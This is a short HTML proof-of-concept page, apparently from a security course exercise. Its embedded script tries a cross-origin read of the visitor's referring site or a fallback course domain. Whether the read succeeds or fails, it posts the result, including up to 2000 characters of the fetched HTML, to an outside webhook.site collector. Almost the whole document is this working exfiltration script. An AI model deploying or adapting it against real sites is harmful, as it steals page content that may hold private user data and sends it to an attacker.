<!DOCTYPE html>
<html>
<head><title>CORS Check</title></head>
<body>
    <h1>Checking target...</h1>
    <pre id="log"></pre>
    <script>
        const webhook = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
        const log = document.getElementById('log');
        
        // Берем сайт, с которого пришел пользователь, или указываем вручную
        const target = document.referrer || 'https://cats.is-course.ru';
        
        log.textContent = `Пытаемся прочитать: ${target}\n`;

        fetch(target, { method: 'GET', mode: 'cors' })
            .then(res => {
                log.textContent += `✅ УСПЕХ! Статус: ${res.status}\n`;
                log.textContent += `CORS разрешает чтение этого сайта!\n`;
                return res.text();
            })
            .then(html => {
                log.textContent += `Длина HTML: ${html.length} байт.\n`;
                // Отправляем первые 2000 символов тебе
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        source: 'CORS_SUCCESS',
                        target: target,
                        html_snippet: html.substring(0, 2000)
                    })
                });
            })
            .catch(err => {
                log.textContent += `❌ ПРОВАЛ. Ошибка: ${err.message}\n`;
                log.textContent += `Это значит, что CORS закрыт. Прочитать HTML через браузер НЕВОЗМОЖНО.`;
                
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        source: 'CORS_BLOCKED',
                        target: target,
                        error: err.message
                    })
                });
            });
    </script>
</body>
</html>
